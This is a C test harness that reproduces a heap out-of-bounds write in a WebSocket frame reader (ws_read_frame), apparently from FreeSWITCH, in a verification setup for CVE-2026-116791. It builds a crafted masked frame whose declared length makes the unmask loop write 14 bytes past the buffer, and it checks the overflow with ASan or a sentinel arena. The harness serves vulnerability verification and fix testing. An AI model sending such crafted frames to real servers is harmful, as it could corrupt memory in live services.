/*
 * Direct-call harness for CVE-2026-116791 / GHSA-whfw-c3jj-99rp.
 *
 * The function under test (ws_read_frame) is INCLUDED VERBATIM from a pinned
 * ws.c via FNS. Everything else here is a deterministic stub: a scripted
 * ws_raw_read feed, a no-op logical layer, and a controlled bbuffer. No
 * sockets, no SSL, no FreeSWITCH build, no wire input.
 *
 *   vuln  case: 64-bit length + mask, payload == bbuflen (64).
 *               datalen = 14 + 64 = 78, rplen = 64 -> unmask loop indexes
 *               body[64..77], 14 bytes past the 64-byte bbuffer.
 *   safe  case: payload == 48; unmask loop stays inside bbuffer.
 *
 * ASan build: bbuffer uses the pin's own ws_init allocation size
 *             (v1.13.17 malloc(bbuflen); v1.13.18 malloc(bbuflen+1)).
 * Plain build (-DPLAIN_MODE): bbuffer sits at the front of a controlled
 *             arena whose trailing bytes are a 0xEE sentinel, so the XOR
 *             result past the conceptual allocation is directly readable.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <byteswap.h>
#include <endian.h>
#include <arpa/inet.h>
#include <sys/types.h>

#ifndef WS_BLOCK
#define WS_BLOCK 10000
#endif

typedef int ws_socket_t;
struct SSL; struct SSL_CTX;
typedef struct SSL SSL;
typedef struct SSL_CTX SSL_CTX;

typedef enum { WS_NONE=0, WS_NORMAL=1000, WS_PROTO_ERR=1002, WS_DATA_TOO_BIG=1009 } ws_cause_t;
typedef enum {
    WSOC_CONTINUATION=0x0, WSOC_TEXT=0x1, WSOC_BINARY=0x2,
    WSOC_CLOSE=0x8, WSOC_PING=0x9, WSOC_PONG=0xA
} ws_opcode_t;

/* Verbatim field layout from pinned ws.h (only SSL typedefs differ). */
typedef struct wsh_s {
    ws_socket_t sock;
    char *buffer;
    char *bbuffer;
    char *body;
    char *uri;
    size_t buflen;
    size_t bbuflen;
    ssize_t datalen;
    char *payload;
    ssize_t plen;
    ssize_t rplen;
    ssize_t packetlen;
    SSL *ssl;
    int handshake;
    uint8_t down;
    int secure;
    uint8_t close_sock;
    SSL_CTX *ssl_ctx;
    int block;
    int sanity;
    int secure_established;
    int logical_established;
    int stay_open;
    int x;
    int ssl_io_error;
    void *write_buffer;
    size_t write_buffer_len;
    ssize_t payload_size_max;
} wsh_t;

/* --- deterministic stubs ------------------------------------------------ */
#define SENTINEL 0xEEu
#define BBUF_LEN 64
#define MASK0 0x41u
#define MASK1 0x5au
#define MASK2 0x42u
#define MASK3 0x43u

static uint8_t g_frame[8192];
static size_t g_frame_len = 0, g_frame_off = 0;

static ssize_t feed(void *data, size_t bytes)
{
    size_t avail = g_frame_len - g_frame_off;
    size_t n = bytes < avail ? bytes : avail;
    if (n) memcpy(data, g_frame + g_frame_off, n);
    g_frame_off += n;
    return (ssize_t)n;
}

int establish_logical_layer(wsh_t *wsh) { (void)wsh; return 0; }
ssize_t ws_raw_read(wsh_t *wsh, void *data, size_t bytes, int block)
{ (void)wsh; (void)block; return feed(data, bytes); }
ssize_t ws_raw_read_blocking(wsh_t *wsh, char *data, size_t max_bytes, int max_retries)
{ (void)wsh; (void)max_retries; return feed(data, max_bytes); }
ssize_t ws_close(wsh_t *wsh, int16_t reason) { (void)wsh; (void)reason; return -1; }
ssize_t ws_write_frame(wsh_t *wsh, ws_opcode_t oc, void *data, size_t bytes)
{ (void)wsh; (void)oc; (void)data; return (ssize_t)bytes; }

uint64_t ntoh64(uint64_t val)
{
    if (__BYTE_ORDER == __BIG_ENDIAN) return val;
    return bswap_64(val);
}

/* --- verbatim pinned function ------------------------------------------- */
#include FNS

/* --- driver ------------------------------------------------------------- */
static void build_frame(size_t payload_len)
{
    uint64_t be;
    size_t i;
    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };

    g_frame[0] = 0x82;                    /* FIN | WSOC_BINARY */
    g_frame[1] = 0xFF;                    /* MASK | 127 (64-bit length) */
    be = htobe64((uint64_t)payload_len);
    memcpy(g_frame + 2, &be, 8);
    memcpy(g_frame + 10, mask, 4);
    for (i = 0; i < payload_len; i++)
        g_frame[14 + i] = (uint8_t)(0x11u + (i % 7u));
    g_frame_len = 14 + payload_len;
    g_frame_off = 0;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "vuln";
    int safe = (strcmp(mode, "safe") == 0);
    size_t payload_len = safe ? BBUF_LEN - 16 : BBUF_LEN;
    const uint8_t mask[4] = { MASK0, MASK1, MASK2, MASK3 };
    wsh_t wsh;
    ws_opcode_t oc = WSOC_CONTINUATION;
    uint8_t *data = NULL;
    ssize_t rv;
#ifdef PLAIN_MODE
    static uint8_t arena[BBUF_LEN + 64];
#endif
    memset(&wsh, 0, sizeof(wsh));
    wsh.handshake = 1;
    wsh.buflen = 4096;
    wsh.buffer = (char *)malloc(wsh.buflen);
    if (!wsh.buffer) return 2;
    wsh.bbuflen = BBUF_LEN;

#ifdef PLAIN_MODE
    memset(arena, SENTINEL, sizeof(arena));
    wsh.bbuffer = (char *)arena;
#else
    /* Pin's own ws_init allocation semantics (verbatim lines):
     *   v1.13.17: wsh->bbuffer = malloc(wsh->bbuflen);
     *   v1.13.18: wsh->bbuffer = malloc(wsh->bbuflen + 1);  (NUL slot)
     */
#ifdef PIN_FIXED
    wsh.bbuffer = (char *)malloc(wsh.bbuflen + 1);
#else
    wsh.bbuffer = (char *)malloc(wsh.bbuflen);
#endif
    if (!wsh.bbuffer) return 2;
#endif
    wsh.payload_size_max = 4 * 1024 * 1024;
    wsh.body = wsh.bbuffer;

    build_frame(payload_len);
    fprintf(stderr, "PRECALL PAYLOAD=%zu BBUFLEN=%zu MASK=%02x%02x%02x%02x\n",
            payload_len, wsh.bbuflen, mask[0], mask[1], mask[2], mask[3]);
    rv = ws_read_frame(&wsh, &oc, &data);

    printf("PIN=%s MODE=%s RV=%zd DATALEN=%zd RPLEN=%zd BBLEN=%zu OC=%d\n",
           PIN, mode, rv, wsh.datalen, wsh.rplen, wsh.bbuflen, (int)oc);

#ifdef PLAIN_MODE
    if (!safe) {
        size_t i;
        int bad = 0;
        /* OOB extent: 14 bytes at offsets BBUF_LEN .. BBUF_LEN+13.
         * offset BBUF_LEN is overwritten by the terminating NUL after the
         * XOR loop; offsets BBUF_LEN+1..+13 carry SENTINEL ^ mask[i%4]. */
        if (arena[BBUF_LEN] != 0x00u) bad = 1;
        for (i = BBUF_LEN + 1; i <= BBUF_LEN + 13; i++) {
            uint8_t expect = (uint8_t)(SENTINEL ^ mask[i % 4]);
            if (arena[i] != expect) bad = 1;
        }
        if (arena[BBUF_LEN + 14] != SENTINEL) bad = 1;
        printf("CHOSEN_BAD=%d NUL=%02x B1=%02x B2=%02x B3=%02x B13=%02x TAIL=%02x\n",
               bad, arena[BBUF_LEN], arena[BBUF_LEN + 1], arena[BBUF_LEN + 2],
               arena[BBUF_LEN + 3], arena[BBUF_LEN + 13], arena[BBUF_LEN + 14]);
        return bad;
    } else {
        int bad = 0;
        size_t i;
        for (i = BBUF_LEN; i <= BBUF_LEN + 13; i++)
            if (arena[i] != SENTINEL) bad = 1;
        printf("SAFE_BAD=%d FIRST=%02x\n", bad, arena[BBUF_LEN]);
        return bad;
    }
#else
    printf("ASAN_CASE_DONE %s\n", mode);
    return 0;
#endif
}
